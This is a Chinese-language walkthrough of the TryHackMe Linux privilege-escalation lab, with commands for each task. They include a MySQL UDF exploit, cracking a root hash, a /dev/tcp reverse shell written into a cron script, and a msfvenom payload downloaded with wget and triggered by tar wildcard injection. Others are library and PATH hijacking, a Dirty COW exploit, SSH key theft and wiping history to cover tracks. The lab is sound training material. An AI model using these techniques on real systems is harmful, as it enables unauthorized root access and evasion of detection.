# TryHackMe Linux PrivEsc房间



## task1：

ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa user@10.49.189.60



## task2：

```
# MySQL UDF 提权
- **适用场景**：MySQL 以 root 运行，且知道 root 密码（或密码为空）。
- **关键命令**：
  ```bash
  # 1. 编译共享库
  gcc -g -c raptor_udf2.c -fPIC
  gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
  
  # 2. 登录 MySQL
  mysql -u root (空密码)
  
  # 3. 加载 UDF
  use mysql;
  create table foo(line blob);
  insert into foo values(load_file('/path/to/raptor_udf2.so'));
  select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
  create function do_system returns integer soname 'raptor_udf2.so';
  
  # 4. 提权
  select do_system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash');
  /tmp/rootbash -p
  
  #5. 删除临时文件
  rm /tmp/rootbash
  exit
```



## task3：

```
cat /etc/shadow

echo 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::' > hash.txt

john --format=sha512crypt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

john --show hash.txt
root:password123:17298:0:99999:7:::

su root

password123
```



## task 4-5:

```
ls -l /etc/shadow
-rw-r--rw- 1 root shadow 6900 Jun 16 08:37 /etc/shadow

mkpasswd -m sha-512 123456
$6$or7zTWhKPnVRhmya$EF8tXR/mWAeg8DOv3gMViyEfrlWwUpu5TL.1XVAYtaVLg1HSWTCjFRFd2TcWNdmU5lBNwgEVr/JCwHP5VWwvd0



vim /etc/shadow

修改root的哈希码为上述哈希码



su root

输入123456

user@debian:~$ su root
Password: 
root@debian:/home/user# whoami
root
root@debian:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@debian:/home/user# 
```



## task6：

学习在GTFOBins查询提权方法



## task7：

```
当输入sudo-l出现以下内容时：

sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH

查看目标程序依赖的库

ldd /usr/sbin/apache2   # 以 apache2 为例

编译恶意共享库，命名为其中一个依赖库（如 libcrypt.so.1）

gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c

运行 sudo 程序，并设置 LD_LIBRARY_PATH

sudo LD_LIBRARY_PATH=/tmp apache2
```



## task8：

```
# 查看 crontab
cat /etc/crontab

# 定位脚本
locate overwrite.sh   # 或 find / -name overwrite.sh 2>/dev/null

# 检查权限
ls -l /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 56 Jun 18 08:22 /usr/local/bin/overwrite.sh

# 写入反弹 shell
echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
echo 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1' >> /usr/local/bin/overwrite.sh

# 在 Kali 中监听
nc -nvlp 4444

# 等待连接，获得 root shell
```



## task9：

```

# 查看 crontab
cat /etc/crontab

# 输出以下内容：
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root overwrite.sh

# 创建恶意脚本（注意用 cron 任务中的文件名）
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +xs /tmp/rootbash' > /home/user/overwrite.sh
chmod +x /home/user/overwrite.sh

# 等待 1 分钟后提权
/tmp/rootbash -p

# 清理
rm /tmp/rootbash
rm /home/user/overwrite.sh
```



## task10:

```
# Task 10 – Cron 通配符提权（tar checkpoint）
# 环境：Debian/Ubuntu，root 定时执行 tar *（如 /usr/local/bin/compress.sh）

# 1. 查看 cron 调用的脚本（确认 tar 命令含通配符）
cat /usr/local/bin/compress.sh

# 2. 生成反向 shell ELF（攻击机 Kali）
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf

# 3. 传输 payload 到目标机（攻击机开 HTTP 服务）
sudo python3 -m http.server 80
# 目标机下载
wget http://10.10.10.10/shell.elf -O /home/user/shell.elf

# 4. 赋予执行权限（目标机）
chmod +x /home/user/shell.elf

# 5. 创建触发文件（利用 tar 的 --checkpoint 选项）
cd /home/user
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=shell.elf"

# 6. 攻击机开启监听
nc -lvnp 4444

# 7. 等待 cron 运行（1 分钟内），获得 root shell
# （也可手动触发测试：tar -czf /tmp/test.tar.gz /home/user/*）

# 8. 清理痕迹（可选）
rm /home/user/--checkpoint* /home/user/shell.elf
```



## task11：

```
# 1. 查找所有 SUID/SGID 文件（确认 exim 存在）
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
# 重点关注 /usr/sbin/exim-4.84-3

# 2. 运行现成的漏洞利用脚本（若已提供）
/home/user/tools/suid/exim/cve-2016-1531.sh
# 执行后获得 root shell

# 3. 提权成功后退出 root shell（继续后续任务）
exit
```



## task12：

```
# 1. 执行 SUID 程序，观察行为（当前只显示进度条）
/usr/local/bin/suid-so
# 显示进度条后退出，未提权

# 2. 使用 strace 跟踪程序，找出它尝试加载但找不到的 .so 文件
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
# 输出显示尝试 open("/home/user/.config/libcalc.so") 失败（No such file）

# 3. 创建缺失的目录（即 .so 文件的父目录）
mkdir /home/user/.config

# 4. 查看已有的恶意共享库源代码（示例已提供）
cat /home/user/tools/suid/libcalc.c
# 代码内容通常为：包含 shell 启动函数（如 execve("/bin/bash")）

# 5. 编译恶意共享库到目标位置
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
# -shared 生成共享库，-fPIC 位置无关代码

# 6. 再次执行 SUID 程序，这次会加载我们的恶意 .so 并提权
/usr/local/bin/suid-so
# 获得 root shell（而非进度条）

# 7. 退出 root shell（继续后续任务）
exit

rm -rf /home/user/.config
# 删除创建的目录及库文件
```

## task13：

```
# 1. 执行 SUID 程序，观察其行为（试图启动 apache2 服务）
/usr/local/bin/suid-env
# 输出显示类似 "Starting web server..." 但无提权迹象

# 2. 查看程序内嵌的字符串，确认调用了 "service apache2 start"
strings /usr/local/bin/suid-env
# 输出中会包含 "service apache2 start" 一行

# 3. 编译恶意 service 程序（该程序会生成一个 Bash shell）
gcc -o service /home/user/tools/suid/service.c
# 将 service.c 编译为当前目录下的可执行文件 service

# 4. 将当前目录（.）添加到 PATH 最前面，并执行 SUID 程序
PATH=.:$PATH /usr/local/bin/suid-env
# 此时系统会优先在当前目录查找 "service"，找到我们编译的恶意程序并以 root 权限执行
# 成功获得 root shell

# 5. 退出 root shell（继续后续任务）
exit

rm -f service
# 删除我们创建的恶意 service 程序
```

## task14：

```
# 1. 查看程序内的字符串，确认其调用了 service 的绝对路径
strings /usr/local/bin/suid-env2
# 输出中包含 "/usr/sbin/service apache2 start"

# 2. 检查 Bash 版本是否低于 4.2-048（符合条件）
/bin/bash --version
# 显示版本号如 "GNU bash, version 4.2.37(1)-release"

# 3. 创建以绝对路径命名的 Bash 函数，执行 /bin/bash -p（保留权限）
function /usr/sbin/service { /bin/bash -p; }
# 定义函数：当调用 /usr/sbin/service 时，执行 /bin/bash -p（-p 保留 root 权限）

# 4. 导出该函数，使其被子进程继承
export -f /usr/sbin/service
# 导出后，环境变量中会记录该函数定义

# 5. 运行 SUID 程序，触发函数执行
/usr/local/bin/suid-env2
# 程序调用 /usr/sbin/service 时，实际执行的是我们定义的函数，获得 root shell

# 6. 退出 root shell（继续后续任务）
exit

unset -f /usr/sbin/service
# 取消已导出的函数
```

## task15：

```
# 1. 确认 Bash 版本低于 4.4（如果之前已确认，可跳过）
/bin/bash --version
# 显示版本如 4.2.37(1)-release

# 2. 运行 SUID 程序，同时设置调试模式和恶意 PS4 变量
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
# -i 清除所有环境变量，确保不受干扰
# SHELLOPTS=xtrace 启用 Bash 调试模式（每条命令执行前输出 PS4）
# PS4 的内容会在调试输出时被 Bash 执行，此处嵌入命令：复制 /bin/bash 到 /tmp/rootbash 并设置 SUID 权限

# 3. 执行生成的 /tmp/rootbash，并使用 -p 保留权限获得 root shell
/tmp/rootbash -p
# -p 让 Bash 以有效用户 ID（root）运行，不降权

# 4. 清理痕迹（删除 SUID bash 副本）
rm /tmp/rootbash

# 5. 退出 root shell（继续后续任务）
exit
```

## task16：

```
# 1. 查看用户主目录下所有历史文件的内容（隐藏文件）
cat ~/.*history | less
# 输出显示用户曾运行 mysql 命令，密码直接在 -p 参数后明文给出，无空格

# 2. 使用历史中找到的密码切换到 root 用户
su root
# 输入历史文件中发现的密码，成功切换为 root

# 3. 提权成功后退出 root shell
exit

# 清除当前用户的命令历史（避免暴露利用痕迹）
history -c
> ~/.bash_history
# 或直接删除历史文件（需谨慎）
rm ~/.bash_history
```

## task17：

```
# 1. 列出当前用户主目录内容，寻找配置文件
ls /home/user
# 发现 myvpn.ovpn 文件

# 2. 查看配置文件内容
cat /home/user/myvpn.ovpn
# 文件内可能包含指向另一个文件的引用，或直接包含 root 用户的密码

# 3. 使用找到的凭据切换到 root 用户
su root
# 输入配置文件中发现的密码，成功切换为 root

# 4. 退出 root shell（继续后续任务）
exit
```

## task18：

```
# 1. 查看根目录下所有文件（包括隐藏目录）
ls -la /
# 发现 /.ssh 隐藏目录

# 2. 查看 /.ssh 目录内容，寻找可读的私钥文件
ls -l /.ssh
# 发现 root_key 文件，权限为 -rw-r--r--（全局可读）

# 3. 查看私钥文件内容（务必复制完整，包括 BEGIN/END 行）
cat /.ssh/root_key
# 输出类似：
# -----BEGIN RSA PRIVATE KEY-----
# MIIEowIBAAKCAQEA...
# ...
# -----END RSA PRIVATE KEY-----

# 4. 在 Kali 攻击机上创建私钥文件（直接粘贴全部内容）
cat > /home/kali/root_key
# 粘贴从 BEGIN 到 END 的所有行，按 Ctrl+D 保存

# 5. 设置私钥文件权限（SSH 要求 600 或更严格）
chmod 600 /home/kali/root_key

# 6. 使用私钥以 root 身份 SSH 登录靶机（注意老版本 RSA 算法兼容）
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@靶机IP

# 7. 成功获得 root shell 后，退出继续后续任务
exit

# 删除本地私钥副本
rm /home/kali/root_key
```

## task19:

```
# 1. 查看 NFS 共享配置（在目标机上）
cat /etc/exports
# 确认输出中共享选项包含 no_root_squash，如 /tmp *(rw,no_root_squash)

# 2. 在 Kali 上切换到 root（挂载需要 root 权限）
sudo su

# 3. 创建挂载点并挂载目标机的 /tmp 共享
mkdir /tmp/nfs
mount -o rw,vers=3 靶机IP:/tmp /tmp/nfs
# 将目标机的 /tmp 挂载到 Kali 的 /tmp/nfs

# 4. 生成 payload（执行 /bin/bash -p 以保留权限），保存到挂载目录
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
# -p 参数让 bash 以有效 UID 运行，即 root

# 5. 给 payload 添加 SUID 权限（属主为 root）
chmod +xs /tmp/nfs/shell.elf
# 此时目标机上的 /tmp/shell.elf 也是 SUID root

# 6. 在目标机上以低权限用户执行该文件
/tmp/shell.elf
# 成功获得 root shell（若报错 No such file，检查挂载是否成功或生成路径）

# 7. 退出 root shell
exit
```

## task20：

```
# 1. 运行 linux-exploit-suggester-2 确认漏洞存在
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
# 输出中会列出 "Dirty COW" 漏洞

# 2. 编译 Dirty COW 利用代码（c0w.c）
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
# -pthread 启用多线程，漏洞利用依赖线程竞争

# 3. 运行利用程序（可能需要数分钟）
./c0w
# 程序会备份 /usr/bin/passwd 到 /tmp/bak，并替换为生成 shell 的 SUID 文件

# 4. 运行被替换的 /usr/bin/passwd 触发 root shell
/usr/bin/passwd
# 此时执行 passwd 实际执行的是 SUID shell，获得 root 权限

# 5. 恢复原始 passwd 文件并退出
mv /tmp/bak /usr/bin/passwd
exit
```

## task21：

```
cd /home/user/tools/privesc-scripts
./LinEnum.sh -t    # -t 表示 thorough（详尽）模式

./linpeas.sh       #速度最快、最全面

./lse.sh           #LSU 安全增强脚本

没有任何一个脚本能单独识别所有技术。具体表现：

LinEnum：偏传统，对 SUID/Cron/NFS 等基础项目覆盖好，但不抓环境变量、历史文件、某些配置文件。

linpeas：信息最丰富，会扫描历史文件、配置文件、私钥等，但也不检测 tar --checkpoint 或 PS4 这类非常规利用点。

lse：与 LinEnum 类似，主要基于文件和权限检查，不涉及动态利用上下文。
```

